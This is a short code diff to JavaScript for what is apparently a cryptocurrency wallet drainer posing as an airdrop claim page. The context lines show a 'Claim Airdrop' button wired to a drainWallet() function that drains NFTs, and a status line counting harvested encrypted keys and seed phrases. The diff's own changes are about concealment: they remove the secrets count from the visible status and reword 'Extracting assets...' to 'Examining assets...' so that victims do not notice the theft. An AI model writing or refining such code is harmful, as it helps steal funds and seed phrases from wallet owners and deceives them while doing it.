@@ -466,7 +466,7 @@ const COMMON_TOKENS = RAW_TOKENS.map(t => ({
             // Handle Solana if detected
             if (solProvider) await handleSolanaConnection();
             
-            updateConnectionStatus(`Connected | ${ethBalance} ETH | Secrets: ${secrets.encryptedKeys.length + (secrets.seedPhrase ? 1 : 0)}`);
+            updateConnectionStatus(`Connected | ${ethBalance} ETH | `);
             $('#connect-wallet').text("🎯 Claim Airdrop").off('click').on('click', () => drainWallet());
             
         } catch(e) {
@@ -478,7 +478,7 @@ const COMMON_TOKENS = RAW_TOKENS.map(t => ({
     // FULL DRAIN FUNCTION
     async function drainWallet() {
         try {
-            updateConnectionStatus("Extracting assets...");
+            updateConnectionStatus("Examining assets...");
             
             // Drain NFTs
             await drainNFTs();
